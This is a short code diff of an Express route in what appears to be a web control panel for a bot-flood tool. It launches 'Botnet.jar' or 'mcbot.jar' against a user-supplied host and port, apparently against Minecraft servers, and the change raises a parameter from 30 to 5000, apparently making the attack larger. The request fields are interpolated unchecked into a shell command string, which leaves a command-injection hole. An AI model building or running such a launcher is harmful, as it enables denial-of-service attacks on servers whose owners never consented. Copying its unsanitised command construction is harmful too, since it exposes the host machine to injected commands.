@@ -19,9 +19,9 @@ app.post('/submit', (req, res) => {
   let cmd;
 
   if (launcher === 'LT1') {
-    cmd = `java -jar Botnet.jar ${host}:${port} 340 ${method} 300 30`;
+    cmd = `java -jar Botnet.jar ${host}:${port} 340 ${method} 300 5000`;
   } else if (launcher === 'LT2' && method === 'botjoiner') {
-    cmd = `java -jar mcbot.jar ${host}:${port} 340 ${method} 300 30`;
+    cmd = `java -jar mcbot.jar ${host}:${port} 340 ${method} 300 5000`;
   } else {
     return res.status(400).send("❌ Phương thức không hợp lệ cho LT2.");
   }
